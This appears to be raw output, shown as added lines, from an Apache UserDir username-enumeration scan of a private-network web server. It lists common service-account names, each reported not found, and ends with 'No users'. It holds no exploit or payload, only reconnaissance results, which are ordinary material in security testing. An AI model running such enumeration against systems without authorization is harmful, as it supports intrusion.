+[*] http://10.60.8.35:8080/ - Apache UserDir: 'demos' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'diag' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'distccd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dni' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dnsmasq' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'dradis' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'EZsetup' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'fal' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'fax' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ftp' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'games' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gdm' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'geoclue' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gnats' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gnome-initial-setup' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gopher' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'gropher' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'guest' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'haldaemon' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'halt' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'hplip' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'inetsim' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'informix' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'install' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'iodine' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'irc' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'jet' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'karaf' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'kernoops' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'king-phisher' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'landscape' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'libstoragemgmt' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'libuuid' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lightdm' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'linaro' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'list' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'listen' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lp' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lpadm' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lpadmin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lxd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'lynx' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mail' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'man' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'me' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'messagebus' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'miredo' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mountfs' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mountfsys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mountsys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'mysql' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'news' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'noaccess' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nobody' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nobody4' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ntp' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nuucp' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nxautomation' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'nxpgsql' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'omi' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'omsagent' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'operator' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'oracle' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'OutOfBox' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pi' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pico' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'polkitd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pollinate' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'popr' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'postfix' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'postgres' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'postmaster' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'printer' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'proxy' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'pulse' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'radxa' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'redsocks' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rfindd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'riscv' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rje' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rock' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'root' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ROOT' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rooty' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rpc' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rpcuser' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rtkit' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'rwhod' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'saned' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'service' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'setroubleshoot' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'setup' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sgiweb' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'shutdown' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sigver' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'speech-dispatcher' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sshd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sslh' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sssd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'stunnel4' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sym' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'symop' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sync' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sysadm' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sysadmin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'sysbin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'syslog' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'system_admin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-bus-proxy' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-coredump' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-network' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-resolve' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'systemd-timesync' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'tcpdump' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'trouble' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'tss' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ubuntu' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'udadmin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'ultra' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'umountfs' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'umountfsys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'umountsys' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'unix' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'unscd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'us_admin' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'usbmux' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'user' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'uucp' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'uucpadm' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'uuidd' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'vagrant' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'varnish' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'web' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'webmaster' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'whoopsie' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'www' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'www-data' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'xpdb' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'xpopr' not found
+[*] http://10.60.8.35:8080/ - Apache UserDir: 'zabbix' not found
+[*] http://10.60.8.35:8080/ - No users
